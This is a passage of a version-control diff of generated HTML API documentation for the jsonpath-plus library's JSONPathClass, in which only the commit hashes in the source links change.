class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Constructors\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Constructors</summary><div><a href=\"#constructor\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#runInNewContext\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>run<wbr/>In<wbr/>New<wbr/>Context</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/classes/JSONPathClass.html:\n```\n@@ -1,23 +1,23 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathClass | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathClass.html\">JSONPathClass</a></li></ul><h1>Class JSONPathClass</h1></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L174\">jsonpath.d.ts:174</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Constructors</h3><div class=\"tsd-index-list\"><a href=\"JSONPathClass.html#constructor\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathClass | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathClass.html\">JSONPathClass</a></li></ul><h1>Class JSONPathClass</h1></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L174\">jsonpath.d.ts:174</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Constructors</h3><div class=\"tsd-index-list\"><a href=\"JSONPathClass.html#constructor\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a>\n </div></section><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPathClass.html#cache\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a>\n </div></section><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Methods</h3><div class=\"tsd-index-list\"><a href=\"JSONPathClass.html#evaluate\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a>\n <a href=\"JSONPathClass.html#toPathArray\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a>\n <a href=\"JSONPathClass.html#toPathString\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a>\n <a href=\"JSONPathClass.html#toPointer\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a>\n </div></section></div></details></section></section><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Constructors\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Constructors</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"constructor\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>constructor</span><a href=\"#constructor\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"constructor.new_JSONPathClass\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-constructor-signature\">new JSONPath<wbr/>Class</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a><a href=\"#constructor.new_JSONPathClass\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><h4 class=\"tsd-returns-title\">Returns <a href=\"JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></h4></li></ul></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Properties\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Properties</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"cache\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>cache</span><a href=\"#cache\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">cache</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>Exposes the cache object for those who wish to preserve and reuse\n it for optimization purposes.</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L179\">jsonpath.d.ts:179</a></li></ul></aside></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"evaluate\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>evaluate</span><a href=\"#evaluate\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L209\">jsonpath.d.ts:209</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></span><ul class=\"tsd-parameters\"><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li></ul></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L215\">jsonpath.d.ts:215</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathArray\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>Array</span><a href=\"#toPathArray\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathArray.toPathArray-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>Array</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span><a href=\"#toPathArray.toPathArray-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a normalized or unnormalized path as string and\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L179\">jsonpath.d.ts:179</a></li></ul></aside></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"evaluate\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>evaluate</span><a href=\"#evaluate\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L209\">jsonpath.d.ts:209</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></span><ul class=\"tsd-parameters\"><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span 